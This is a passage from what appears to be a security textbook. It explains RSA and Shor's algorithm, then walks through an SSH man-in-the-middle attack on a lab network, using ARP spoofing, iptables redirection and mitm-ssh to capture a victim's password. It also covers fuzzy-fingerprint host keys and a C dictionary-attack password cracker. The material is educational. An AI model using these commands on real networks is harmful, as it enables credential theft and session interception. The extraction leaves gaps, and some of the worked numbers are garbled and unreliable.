and 8 are relatively prime to 9.\nIt should be easy to notice that if N is prime, \u03c6(N ) will be N \u2212 1. A somewhat\nless obvious fact is that if N is the product of exactly two prime numbers, P\nand Q, then \u03c6(P \u00b7 Q) = (P \u2212 1) \u00b7 (Q \u2212 1). This comes in handy, since \u03c6(N)\nAn encryption key, E, that is relatively prime to \u03c6(N), must be chosen\nat random. Then a decryption key must be found that satisfies the following\nThis can be solved with the extended Euclidean algorithm. The Euclidean\nalgorithm is a very old algorithm that happens to be a very fast way to calculate\nthe greatest common divisor (GCD) of two numbers. The larger of the two\nnumbers is divided by the smaller number, paying attention only to the\nremainder. Then, the smaller number is divided by the remainder, and\nthe process is repeated until the remainder is zero. The last value for the\nremainder before it reaches zero is the greatest common divisor of the two\noriginal numbers. This algorithm is quite fast, with a run time of O(log10N).\nThat means that it should take about as many steps to find the answer as\nIn the table below, the GCD of 7253 and 120, written as gcd(7253, 120),\nwill be calculated. The table starts by putting the two numbers in the columns\nA and B, with the larger number in column A. Then A is divided by B, and\nthe remainder is put in column R. On the next line, the old B becomes the\nnew A, and the old R becomes the new B. R is calculated again, and this\nprocess is repeated until the remainder is zero. The last value of R before\nSo, the greatest common divisor of 7243 and 120 is 1. That means that\nThe extended Euclidean algorithm deals with finding two integers, J and K,\nThis is done by working the Euclidean algorithm backward. In this case,\nthough, the quotients are important. Here is the math from the prior\nWith a little bit of basic algebra, the terms can be moved around for each\nline so the remainder (shown in bold) is by itself on the left of the equal sign:\nThe line above that, though, is 2 = 11 \u2212 3 \u00b7 3, which gives a substitution\nThe line above that shows that 3 = 14 \u2212 1 \u00b7 11, which can also be\nOf course, the line above that shows that 11 = 53 \u2212 3 \u00b7 14, prompting\nFollowing the pattern, we use the line that shows 14 = 120 \u2212 2 \u00b7 53,\nAnd finally, the top line shows that 53 = 7253 \u2212 60 \u00b7 120, for a final\nThis shows that J and K would be 2599 and \u221243, respectively.\nThe numbers in the previous example were chosen for their relevance to\nRSA. Assuming the values for P and Q are 11 and 13, N would be 143. There-\nfore, \u03c6(N) = 120 = (11 \u2212 1) \u00b7 (13 \u2212 1). Since 7253 is relatively prime to 120,\nIf you recall, the goal was to find a value for D that satisfies the following\nSome basic algebra puts it in a more familiar form:\nUsing the values from the extended Euclidean algorithm, it\u2019s apparent\nthat D = \u221243. The value for S doesn\u2019t really matter, which means this math\nis done modulo \u03c6(N), or modulo 120. That, in turn, means that a positive\nequivalent value for D is 77, since 120 \u2212 43 = 77. This can be put into the\nThe values for N and E are distributed as the public key, while D is\nkept secret as the private key. P and Q are discarded. The encryption and\nFor example, if the message, M, is 98, encryption would be as follows:\nThe ciphertext would be 76. Then, only someone who knew the value for\nD could decrypt the message and recover the number 98 from the number 76,\nObviously, if the message, M, is larger than N, it must be broken down\nThis process is made possible by Euler\u2019s totient theorem. It states that\nif M and N are relatively prime, with M being the smaller number, then\nwhen M is multiplied by itself \u03c6(N) times and divided by N, the remainder\nSince this is all done modulo N, the following is also true, due to the way\nThis process could be repeated again and again S times to produce this:\nThis equation is basically the core of RSA. A number, M, raised to a power\nmodulo N, produces the original number M again. This is basically a function\nthat returns its own input, which isn\u2019t all that interesting by itself. But if this\nequation could be broken up into two separate parts, then one part could be\nused to encrypt and the other to decrypt, producing the original message\nagain. This can be done by finding two numbers, E and D, that multiplied\ntogether equal S times \u03c6(N) plus 1. Then this value can be substituted into\nAnd that\u2019s basically RSA. The security of the algorithm is tied to keeping\nD secret. But since N and E are both public values, if N can be factored into\nthe original P and Q, then \u03c6(N) can easily be calculated with (P \u2212 1) \u00b7 (Q \u2212 1),\nand then D can be determined with the extended Euclidean algorithm. There-\nfore, the key sizes for RSA must be chosen with the best-known factoring\nalgorithm in mind to maintain computational security. Currently, the best-\nknown factoring algorithm for large numbers is the number field sieve (NFS).\nThis algorithm has a subexponential run time, which is pretty good, but still\nnot fast enough to crack a 2,048-bit RSA key in a reasonable amount of time.\nOnce again, quantum computation promises amazing increases in computa-\ntion potential. Peter Shor was able to take advantage of the massive parallelism\nof quantum computers to efficiently factor numbers using an old number-\nThe algorithm is actually quite simple. Take a number, N, to factor.\nChoose a value, A, that is less than N. This value should also be relatively\nprime to N, but assuming that N is the product of two prime numbers\n(which will always be the case when trying to factor numbers to break RSA),\nif A isn\u2019t relatively prime to N, then A is one of N\u2019s factors.\nNext, load up the superposition with sequential numbers counting\nup from 1 and feed every one of those values through the function\nf(x) = Ax(modN). This is all done at the same time, through the magic\nof quantum computation. A repeating pattern will emerge in the results,\nand the period of this repetition must be found. Luckily, this can be done\nquickly on a quantum computer with a Fourier transform. This period will\nThen, simply calculate gcd(AR/2 + 1, N) and gcd(AR/2 \u2212 1, N). At least one\nof these values should be a factor of N. This is possible because AR = 1(modN)\nThis means that (AR/2 \u2212 1) \u00b7 (AR/2 + 1) is an integer multiple of N. As\nlong as these values don\u2019t zero themselves out, one of them will have a factor\nTo crack the previous RSA example, the public value N must be factored.\nIn this case N equals 143. Next, a value for A is chosen that is relatively prime to\nand less than N, so A equals 21. The function will look like f(x) = 21x(mod143).\nEvery sequential value from 1 up to as high as the quantum computer will\nTo keep this brief, the assumption will be that the quantum computer\nhas three quantum bits, so the superposition can hold eight values.\nHere the period is easy to determine by eye: R is 4. Armed with this\ninformation, gcd(212 \u2212 1143) and gcd(212 + 1143) should produce at\nleast one of the factors. This time, both factors actually appear, since\ngcd(440, 143) = 11 and gcd(442, 142) = 13. These factors can then be\nused to recalculate the private key for the previous RSA example.\nA hybrid cryptosystem gets the best of both worlds. An asymmetric cipher\nis used to exchange a randomly generated key that is used to encrypt the\nremaining communications with a symmetric cipher. This provides the\nspeed and efficiency of a symmetric cipher, while solving the dilemma of\nsecure key exchange. Hybrid ciphers are used by most modern cryptographic\nSince most applications use ciphers that are resistant to cryptanalysis,\nattacking the cipher usually won\u2019t work. However, if an attacker can inter-\ncept communications between both parties and masquerade as one or the\nA man-in-the-middle (MitM) attack is a clever way to circumvent encryption.\nThe attacker sits between the two communicating parties, with each party\nbelieving they are communicating with the other party, but both are com-\nWhen an encrypted connection between the two parties is established, a\nsecret key is generated and transmitted using an asymmetric cipher. Usually,\nthis key is used to encrypt further communication between the two parties.\nSince the key is securely transmitted and the subsequent traffic is secured by\nthe key, all of this traffic is unreadable by any would-be attacker sniffing these\nHowever, in an MitM attack, party A believes that she is communicating\nwith B, and party B believes he is communicating with A, but in reality, both\nare communicating with the attacker. So, when A negotiates an encrypted\nconnection with B, A is actually opening an encrypted connection with the\nattacker, which means the attacker securely communicates with an asymmetric\ncipher and learns the secret key. Then the attacker just needs to open another\nencrypted connection with B, and B will believe that he is communicating\nThis means that the attacker actually maintains two separate encrypted\ncommunication channels with two separate encryption keys. Packets from A\nare encrypted with the first key and sent to the attacker, which A believes is\nactually B. The attacker then decrypts these packets with the first key and\nre-encrypts them with the second key. Then the attacker sends the newly\nencrypted packets to B, and B believes these packets are actually being sent\nby A. By sitting in the middle and maintaining two separate keys, the attacker\nis able to sniff and even modify traffic between A and B without either side\nAfter redirecting traffic using an ARP cache poisoning tool, there are a\nnumber of SSH man-in-the-middle attack tools that can be used. Most of\nthese are just modifications to the existing openssh source code. One notable\nexample is the aptly named mitm-ssh package, by Claes Nyberg, which has\nThis can all be done with the ARP redirection technique from \u201cActive\nSniffing\u201d on page 239 and a modified openssh package aptly called mitm-\nssh. There are other tools that do this; however, Claes Nyberg\u2019s mitm-ssh\nis publicly available and the most robust. The source package is on the\nLiveCD in /usr/src/mitm-ssh, and it has already been built and installed.\nWhen running, it accepts connections to a given port and then proxies\nthese connections to the real destination IP address of the target SSH\nserver. With the help of arpspoof to poison ARP caches, traffic to the target\nSSH server can be redirected to the attacker\u2019s machine running mitm-ssh.\nSince this program listens on localhost, some IP filtering rules are needed\nIn the example below, the target SSH server is at 192.168.42.72. When\nmitm-ssh is run, it will listen on port 2222, so it doesn\u2019t need to be run as\nroot. The iptables command tells Linux to redirect all incoming TCP con-\nnections on port 22 to localhost 2222, where mitm-ssh will be listening.\nreader@hacking:~ $ sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\ntarget     prot opt source               destination\nREDIRECT   tcp  --  anywhere             anywhere            tcp dpt:ssh redir ports 2222\ntarget     prot opt source               destination\ntarget     prot opt source               destination\n/|\\    SSH Man In The Middle [Based on OpenSSH_3.9p1]\n-n             - Do not attempt to resolve hostnames\n-d             - Debug, repeat to increase verbosity\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222\nThen in another terminal window on the same machine, Dug Song\u2019s\narpspoof tool is used to poison ARP caches and redirect traffic destined for\nreader@hacking:~ $ sudo arpspoof -i eth0 192.168.42.72\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\n0:12:3f:7:39:9c ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.42.72 is-at 0:12:3f:7:39:9c\nAnd now the MitM attack is all set up and ready for the next unsus-\npecting victim. The output below is from another machine on the network\n(192.168.42.250), which makes an SSH connection to 192.168.42.72.\nOn Machine 192.168.42.250 (tetsuo), Connecting to 192.168.42.72 (loki)\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is 84:7a:71:58:0f:b5:5e:1b:17:d7:b5:9c:81:5a:56:7c.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\nLast login: Mon Oct  1 06:32:37 2007 from 192.168.42.72\nLinux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686\n.  ..  .bash_logout  .bash_profile  .bashrc  .bashrc.swp  .profile  Examples\nEverything seems okay, and the connection appeared to be secure.\nHowever, the connection was secretly routed through the attacker\u2019s\nmachine, which used a separate encrypted connection to back to the\ntarget server. Back on the attacker\u2019s machine, everything about the\nreader@hacking:~ $ sudo mitm-ssh 192.168.42.72 -v -n -p 2222\nWARNING: /usr/local/etc/moduli does not exist, using fixed modulus\n[MITM] Found real target 192.168.42.72:22 for NAT host 192.168.42.250:1929\n[MITM] Routing SSH2 192.168.42.250:1929 -> 192.168.42.72:22\n[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22\nSSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt\nreader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/passwd.log\n[2007-10-01 13:33:42] MITM (SSH2) 192.168.42.250:1929 -> 192.168.42.72:22\nSSH2_MSG_USERAUTH_REQUEST: jose ssh-connection password 0 sP#byp%srt\nreader@hacking:~ $ cat /usr/local/var/log/mitm-ssh/ssh2*\nLast login: Mon Oct  1 06:32:37 2007 from 192.168.42.72\nLinux loki 2.6.20-16-generic #2 SMP Thu Jun 7 20:19:32 UTC 2007 i686\n.  ..  .bash_logout  .bash_profile  .bashrc  .bashrc.swp  .profile  Examples\nSince the authentication was actually redirected, with the attacker\u2019s\nmachine acting as a proxy, the password sP#byp%srt could be sniffed. In\naddition, the data transmitted during the connection is captured, showing\nthe attacker everything the victim did during the SSH session.\nThe attacker\u2019s ability to masquerade as either party is what makes this\ntype of attack possible. SSL and SSH were designed with this in mind and\nhave protections against identity spoofing. SSL uses certificates to validate\nidentity, and SSH uses host fingerprints. If the attacker doesn\u2019t have the\nproper certificate or fingerprint for B when A attempts to open an encrypted\ncommunication channel with the attacker, the signatures won\u2019t match and A\nIn the previous example, 192.168.42.250 (tetsuo) had never previously\ncommunicated over SSH with 192.168.42.72 (loki) and therefore didn\u2019t\nhave a host fingerprint. The host fingerprint that it accepted was actually\nthe fingerprint generated by mitm-ssh. If, however, 192.168.42.250 (tetsuo)\nhad a host fingerprint for 192.168.42.72 (loki), the whole attack would\nhave been detected, and the user would have been presented with a very\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\nIT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!\nSomeone could be eavesdropping on you right now (man-in-the-middle attack)!\nIt is also possible that the RSA host key has just been changed.\nThe fingerprint for the RSA key sent by the remote host is\nAdd correct host key in /home/jon/.ssh/known_hosts to get rid of this message.\nRSA host key for 192.168.42.72 has changed and you have requested strict checking.\nThe openssh client will actually prevent the user from connecting until\nthe old host fingerprint has been removed. However, many Windows SSH\nclients don\u2019t have the same kind of strict enforcement of these rules and will\npresent the user with an \u201cAre you sure you want to continue?\u201d dialog box.\nAn uninformed user might just click right through the warning.\nSSH host fingerprints do have a few vulnerabilities. These vulnerabilities\nhave been compensated for in the most recent versions of openssh, but they\nUsually, the first time an SSH connection is made to a new host, that host\u2019s\nfingerprint is added to a known_hosts file, as shown here:\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\niz@tetsuo:~ $ grep 192.168.42.72 ~/.ssh/known_hosts\nAAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/\nJSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/\nHowever, there are two different protocols of SSH\u2014SSH1 and SSH2\u2014\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA1 key fingerprint is e7:c4:81:fe:38:bc:a8:03:f9:79:cd:16:e9:8f:43:55.\nAre you sure you want to continue connecting (yes/no)? no\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? no\nThe banner presented by the SSH server describes which SSH protocols\nThe banner from 192.168.42.72 (loki) includes the string SSH-1.99, which,\nby convention, means that the server speaks both protocols 1 and 2. Often, the\nSSH server will be configured with a line like Protocol 2,1, which also means\nthe server speaks both protocols and tries to use SSH2 if possible. This is to\nretain backward compatibility, so SSH1-only clients can still connect.\nIn contrast, the banner from 192.168.42.1 includes the string SSH-2.0,\nwhich shows that the server only speaks protocol 2. In this case, it\u2019s obvious\nthat any clients connecting to it have only communicated with SSH2 and\ntherefore only have host fingerprints for protocol 2.\nThe same is true for loki (192.168.42.72); however, loki also accepts SSH1,\nwhich has a different set of host fingerprints. It\u2019s unlikely that a client will\nhave used SSH1, and therefore doesn\u2019t have the host fingerprints for this\nIf the modified SSH daemon being used for the MitM attack forces the\nclient to communicate using the other protocol, no host fingerprint will be\nfound. Instead of being presented with a lengthy warning, the user will simply\nbe asked to add the new fingerprint. The mitm-sshtool uses a configuration\nfile similar to openssh\u2019s, since it\u2019s built from that code. By adding the line\nProtocol 1 to /usr/local/etc/mitm-ssh_config, the mitm-ssh daemon will\nThe output below shows that loki\u2019s SSH server usually speaks using both\nSSH1 and SSH2 protocols, but when mitm-ssh is put in the middle using the\nnew configuration file, the fake server claims it only speaks SSH1 protocol.\nFrom 192.168.42.250 (tetsuo), Just an Innocent Machine on the Network\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.42.72' (RSA) to the list of known hosts.\nOn the Attacker\u2019s Machine, Setting Up mitm-ssh to Only Use SSH1 Protocol\nreader@hacking:~ $ echo \"Protocol 1\" >> /usr/local/etc/mitm-ssh_config\nreader@hacking:~ $ tail /usr/local/etc/mitm-ssh_config\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222\nUsually, clients such as tetsuo connecting to loki at 192.168.42.72 would\nhave only communicated using SSH2. Therefore, there would only be a host\nfingerprint for SSH protocol 2 stored on the client. When protocol 1 is forced\nby the MitM attack, the attacker\u2019s fingerprint won\u2019t be compared to the stored\nfingerprint, due to the differing protocols. Older implementations will simply\nask to add this fingerprint since, technically, no host fingerprint exists for\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6.\nAre you sure you want to continue connecting (yes/no)?\nSince this vulnerability was made public, newer implementations of\nRSA key fingerprint ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established\nbut keys of different type are already known for this host.\nRSA1 key fingerprint is 45:f7:8d:ea:51:0f:25:db:5a:4b:9e:6a:d6:3c:d0:a6.\nAre you sure you want to continue connecting (yes/no)?\nThis modified warning isn\u2019t as strong as the warning given when host\nfingerprints of the same protocol don\u2019t match. Also, since not all clients will\nbe up to date, this technique can still prove to be useful for an MitM attack.\nKonrad Rieck had an interesting idea regarding SSH host fingerprints. Often,\na user will connect to a server from several different clients. The host finger-\nprint will be displayed and added each time a new client is used, and a security-\nconscious user will tend to remember the general structure of the host\nfingerprint. While no one actually memorizes the entire fingerprint, major\nchanges can be detected with little effort. Having a general idea of what the\nhost fingerprint looks like when connecting from a new client greatly increases\nthe security of that connection. If an MitM attack is attempted, the blatant\ndifference in host fingerprints can usually be detected by eye.\nHowever, the eye and the brain can be tricked. Certain fingerprints will\nlook very similar to others. Digits 1 and 7 look very similar, depending on the\ndisplay font. Usually, the hex digits found at the beginning and end of the\nfingerprint are remembered with the greatest clarity, while the middle tends\nto be a bit hazy. The goal behind the fuzzy fingerprint technique is to generate\na host key with a fingerprint that looks similar enough to the original finger-\nThe openssh package provides tools to retrieve the host key from servers.\nreader@hacking:~ $ ssh-keyscan -t rsa 192.168.42.72 > loki.hostkey\nAAAAB3NzaC1yc2EAAAABIwAAAIEA8Xq6H28EOiCbQaFbIzPtMJSc316SH4aOijgkf7nZnH4LirNziH5upZmk4/\nJSdBXcQohiskFFeHadFViuB4xIURZeF3Z7OJtEi8aupf2pAnhSHF4rmMV1pwaSuNTahsBoKOKSaTUOW0RN/1t3G/\n1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72\nNow that the host key fingerprint format is known for 192.168.42.72\n(loki), fuzzy fingerprints can be generated that look similar. A program that\ndoes this has been developed by Rieck and is available at http://www.thc\n.org/thc-ffp/. The following output shows the creation of some fuzzy finger-\n-f type       Specify type of fingerprint to use [Default: md5]\nColon-separated: 01:23:45:67... or as string 01234567...\n-k type       Specify type of key to calculate [Default: rsa]\n-b bits       Number of bits in the keys to calculate [Default: 1024]\n-K mode       Specify key calulation mode [Default: sloppy]\n-m type       Specify type of fuzzy map to use [Default: gauss]\n-v variation  Variation to use for fuzzy map generation [Default: 7.3]\n-y mean       Mean value to use for fuzzy map generation [Default: 0.14]\n-l size       Size of list that contains best fingerprints [Default: 10]\n-s filename   Filename of the state file [Default: /var/tmp/ffp.state]\n-e            Extract SSH host key pairs from state file\n-d directory  Directory to store generated ssh keys to [Default: /tmp]\n-p period     Period to save state file and display state [Default: 60]\nNo state file /var/tmp/ffp.state present, specify a target hash.\nreader@hacking:~ $ ffp -f md5 -k rsa -b 1024 -t ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n---[Initializing]---------------------------------------------------------------\n---[Fuzzy Map]------------------------------------------------------------------\nFuzzy Map:  10.83% | 9.64% : 8.52% | 7.47% : 6.49% | 5.58% : 4.74% | 3.96% :\n3.25% | 2.62% : 2.05% | 1.55% : 1.12% | 0.76% : 0.47% | 0.24% :\n0.09% | 0.01% : 0.00% | 0.06% : 0.19% | 0.38% : 0.65% | 0.99% :\n1.39% | 1.87% : 2.41% | 3.03% : 3.71% | 4.46% : 5.29% | 6.18% :\n---[Current Key]----------------------------------------------------------------\n---[Current State]--------------------------------------------------------------\nRunning:   0d 00h 00m 00s | Total:          0k hashs | Speed:      nan hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nMessage Digest: 6a:06:f9:a6:cf:09:19:af:c3:9d:c5:b9:91:a4:8d:81\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n---[Current State]--------------------------------------------------------------\nRunning:   0d 00h 01m 00s | Total:       7635k hashs | Speed:   127242 hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nMessage Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n---[Current State]--------------------------------------------------------------\nRunning:   0d 00h 02m 00s | Total:      15370k hashs | Speed:   128082 hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nMessage Digest: ba:06:3a:8c:bc:73:24:64:5b:8a:6d:fa:a6:1c:09:80\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n---[Current State]--------------------------------------------------------------\nRunning: 1d 05h 06m 00s | Total: 13266446k hashs | Speed: 126637 hashs/s\n--------------------------------------------------------------------------------\nBest Fuzzy Fingerprint from State File /var/tmp/ffp.state\nMessage Digest: ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50\nTarget Digest: ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0\n--------------------------------------------------------------------------------\nThis fuzzy fingerprint generation process can go on for as long as desired.\nThe program keeps track of some of the best fingerprints and will display them\nperiodically. All of the state information is stored in /var/tmp/ffp.state, so the\nprogram can be exited with a CTRL-C and then resumed again later by simply\nAfter running for a while, SSH host key pairs can be extracted from the\n---[Restoring]------------------------------------------------------------------\n--------------------------------------------------------------------------------\nSaving SSH host key pairs: [00] [01] [02] [03] [04] [05] [06] [07] [08] [09]\n/tmp/ssh-rsa00      /tmp/ssh-rsa02.pub  /tmp/ssh-rsa05      /tmp/ssh-rsa07.pub\n/tmp/ssh-rsa00.pub  /tmp/ssh-rsa03      /tmp/ssh-rsa05.pub  /tmp/ssh-rsa08\n/tmp/ssh-rsa01      /tmp/ssh-rsa03.pub  /tmp/ssh-rsa06      /tmp/ssh-rsa08.pub\n/tmp/ssh-rsa01.pub  /tmp/ssh-rsa04      /tmp/ssh-rsa06.pub  /tmp/ssh-rsa09\n/tmp/ssh-rsa02      /tmp/ssh-rsa04.pub  /tmp/ssh-rsa07      /tmp/ssh-rsa09.pub\nIn the preceding example, 10 public and private host key pairs have\nbeen generated. Fingerprints for these key pairs can then be generated and\ncompared with the original fingerprint, as seen in the following output.\nreader@hacking:~ $ for i in $(ls -1 /tmp/ssh-rsa*.pub)\n1024 ba:0d:7f:d2:64:76:b8:9c:f1:22:22:87:b0:26:59:50 /tmp/ssh-rsa00.pub\n1024 ba:06:7f:12:bd:8a:5b:5c:eb:dd:93:ec:ec:d3:89:a9 /tmp/ssh-rsa01.pub\n1024 ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0 /tmp/ssh-rsa02.pub\n1024 ba:06:49:d4:b9:d4:96:4b:93:e8:5d:00:bd:99:53:a0 /tmp/ssh-rsa03.pub\n1024 ba:06:7c:d2:15:a2:d3:0d:bf:f0:d4:5d:c6:10:22:90 /tmp/ssh-rsa04.pub\n1024 ba:06:3f:22:1b:44:7b:db:41:27:54:ac:4a:10:29:e0 /tmp/ssh-rsa05.pub\n1024 ba:06:78:dc:be:a6:43:15:eb:3f:ac:92:e5:8e:c9:50 /tmp/ssh-rsa06.pub\n1024 ba:06:7f:da:ae:61:58:aa:eb:55:d0:0c:f6:13:61:30 /tmp/ssh-rsa07.pub\n1024 ba:06:7d:e8:94:ad:eb:95:d2:c5:1e:6d:19:53:59:a0 /tmp/ssh-rsa08.pub\n1024 ba:06:74:a2:c2:8b:a4:92:e1:e1:75:f5:19:15:60:a0 /tmp/ssh-rsa09.pub\n1024 ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0 192.168.42.72\nFrom the 10 generated key pairs, the one that seems to look the most\nsimilar can be determined by eye. In this case, ssh-rsa02.pub, shown in bold,\nwas chosen. Regardless of which key pair is chosen, though, it will certainly\nlook more like the original fingerprint than any randomly generated key\nThis new key can be used with mitm-ssh to make for an even more\neffective attack. The location for the host key is specified in the config-\nuration file, so using the new key is simply matter of adding a HostKey line\nin /usr/local/etc/mitm-ssh_config, as shown below. Since we need to remove\nthe Protocol 1 line we added earlier, the output below simply overwrites the\nreader@hacking:~ $ echo \"HostKey /tmp/ssh-rsa02\" > /usr/local/etc/mitm-ssh_config\nreader@hacking:~ $ mitm-ssh 192.168.42.72 -v -n -p 2222Using static route to 192.168.42.72:22\nDisabling protocol version 1. Could not load host key\nIn another terminal window, arpspoof is running to redirect the traffic\nto mitm-ssh, which will use the new host key with the fuzzy fingerprint. The\noutput below compares the output a client would see when connecting.\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7f:d2:b9:74:a8:0a:13:cb:a2:f7:e0:10:59:a0.\nAre you sure you want to continue connecting (yes/no)?\nThe authenticity of host '192.168.42.72 (192.168.42.72)' can't be established.\nRSA key fingerprint is ba:06:7e:b2:64:13:cf:0f:a4:69:17:d0:60:62:69:a0.\nAre you sure you want to continue connecting (yes/no)?\nCan you immediately tell the difference? These fingerprints look similar\nenough to trick most people into simply accepting the connection.\nPasswords aren\u2019t generally stored in plaintext form. A file containing all\nthe passwords in plaintext form would be far too attractive a target, so\ninstead, a one-way hash function is used. The best-known of these functions\nis based on DES and is called crypt(), which is described in the manual\ncrypt()  is  the  password  encryption  function.  It is based on the Data\nEncryption  Standard  algorithm  with  variations  intended  (among  other\nthings) to discourage use of hardware implementations of a key search.\nsalt  is  a  two-character string chosen from the set [a\u2013zA\u2013Z0\u20139./].  This\nstring is used to perturb the algorithm in one of 4096 different ways.\nThis is a one-way hash function that expects a plaintext password and a\nsalt value for input, and then outputs a hash with the salt value prepended\nto it. This hash is mathematically irreversible, meaning that it is impossible to\ndetermine the original password using only the hash. Writing a quick program\nto experiment with this function will help clarify any confusion.\nprintf(\"Usage: %s <plaintext password> <salt value>\\n\", argv[0]);\nprintf(\"password \\\"%s\\\" with salt \\\"%s\\\" \", argv[1], argv[2]);\nprintf(\"hashes to ==> %s\\n\", crypt(argv[1], argv[2]));\nWhen this program is compiled, the crypt library needs to be linked.\nThis is shown in the following output, along with some test runs.\nreader@hacking:~/booksrc $ gcc -o crypt_test crypt_test.c\ncrypt_test.c:(.text+0x73): undefined reference to `crypt'\nreader@hacking:~/booksrc $ gcc -o crypt_test crypt_test.c -l crypt\npassword \"testing\" with salt \"je\" hashes to ==> jeLu9ckBgvgX.\npassword \"test\" with salt \"je\" hashes to ==> jeHEAX1m66RV.\npassword \"test\" with salt \"xy\" hashes to ==> xyVSuHLjceD92\nNotice that in the last two runs, the same password is encrypted, but\nusing different salt values. The salt value is used to perturb the algorithm\nfurther, so there can be multiple hash values for the same plaintext value if\ndifferent salt values are used. The hash value (including the prepended salt)\nis stored in the password file under the premise that if an attacker were to\nsteal the password file, the hashes would be useless.\nWhen a legitimate user needs to authenticate using the password hash,\nthat user\u2019s hash is looked up in the password file. The user is prompted to\nenter her password, the original salt value is extracted from the password file,\nand whatever the user types is sent through the same one-way hash function\nwith the salt value. If the correct password was entered, the one-way hashing\nfunction will produce the same hash output as is stored in the password file.\nThis allows authentication to function as expected, without ever having to\nIt turns out, however, that the encrypted passwords in the password file aren\u2019t\nso useless after all. Sure, it\u2019s mathematically impossible to reverse the hash,\nbut it is possible to just quickly hash every word in a dictionary, using the salt\nvalue for a specific hash, and then compare the result with that hash. If the\nhashes match, then that word from the dictionary must be the plaintext\nA simple dictionary attack program can be whipped up fairly easily. It just\nneeds to read words from a file, hash each one using the proper salt value,\nand display the word if there is a match. The following source code does this\nusing filestream functions, which are included with stdio.h. These functions\nare easier to work with, since they wrap up the messiness of open() calls and\nfile descriptors, using FILE structure pointers, instead. In the source below,\nthe fopen() call\u2019s r argument tells it to open the file for reading. It returns\nNULL on failure, or a pointer to the open filestream. The fgets() call gets\na string from the filestream, up to a maximum length or when it reaches the\nend of a line. In this case, it\u2019s used to read each line from the word-list file.\nThis function also returns NULL on failure, which is used to detect then\nbarf(\"Usage: %s <wordlist file> <password hash>\\n\", argv[0]);\nstrncpy(salt, argv[2], 2); // First 2 bytes of hash are the salt.\nif( (wordlist = fopen(argv[1], \"r\")) == NULL) // Open the wordlist.\nbarf(\"Fatal: couldn't open the file \\'%s\\'.\\n\", argv[1]);\nwhile(fgets(word, 30, wordlist) != NULL) { // Read each word\nword[strlen(word)-1] = '\\0'; // Remove the '\\n' byte at the end.\nhash = crypt(word, salt); // Hash the word using the salt.\nprintf(\"trying word:   %-30s ==> %15s\\n\", word, hash);\nif(strcmp(hash, argv[2]) == 0) { // If the hash matches\nprintf(\"Couldn't find the plaintext password in the supplied wordlist.\\n\");\nThe following output shows this program being used to crack the pass-\nword hash jeHEAX1m66RV., using the words found in 